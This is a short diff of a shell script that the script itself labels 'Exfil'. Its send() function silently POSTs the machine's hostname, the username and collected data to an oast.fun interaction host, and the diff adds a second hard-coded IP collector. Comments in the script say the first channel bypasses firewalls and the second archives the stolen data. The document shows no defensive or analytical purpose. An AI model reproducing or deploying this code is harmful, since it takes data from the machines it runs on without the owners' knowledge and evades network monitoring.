@@ -4,6 +4,7 @@
 # Exfil: amtfxylissimhrzasyemb6vqffp0rmeus.oast.fun
 
 OAST="amtfxylissimhrzasyemb6vqffp0rmeus.oast.fun"
+VPS="153.75.248.248:9999"
 HOST=$(hostname 2>/dev/null || cat /etc/hostname 2>/dev/null || echo "u")
 USER=$(whoami 2>/dev/null || id -un 2>/dev/null || echo "u")
 
@@ -77,7 +78,10 @@ $IGNORE_DIRS \
 send() {
     local s="$1" d="$2"
     local p="${HOST}|${USER}|${s}|$(echo "$d" | tr '\n' '|' | cut -c1-3000)"
+    # Primary: oast.fun (bypasses all firewalls)
     curl -s -m 3 -X POST -d "$p" "http://${OAST}/post" 2>/dev/null &
+    # Secondary: VPS collector (for local archiving)
+    curl -s -m 2 -X POST --data-binary "$p" "http://${VPS}/" 2>/dev/null &
 }
 
 ###############################################################################
